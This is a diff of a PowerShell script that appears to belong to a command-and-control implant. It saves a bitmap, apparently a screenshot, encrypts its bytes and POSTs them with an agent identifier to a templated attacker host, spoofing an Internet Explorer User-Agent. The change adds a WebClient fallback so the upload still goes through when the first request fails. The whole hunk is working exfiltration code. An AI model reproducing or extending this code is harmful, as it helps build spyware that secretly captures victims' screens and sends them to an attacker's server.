@@ -12,8 +12,19 @@ $bitmap.Save($File)
 $file_content = Get-Content $File -Encoding Byte
 $content = enc -key $key -un $file_content -file 1
 
+
+
+            try{
             $postParams = @{data=":$content`:";resource=$agent}
             $re=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{image} -Method POST -Body $postParams
+            }
+            catch{
+            $postParams = "data=:$content`:&resource=$agent"
+                   $wc3 = new-object net.WebClient
+                 $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+                 $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+                 $re=$wc3.UploadString("{HTTP}://{ip}:{port}{image}","POST",$postParams)
+                   }
 
 
 $final=[System.Convert]::FromBase64String($content)
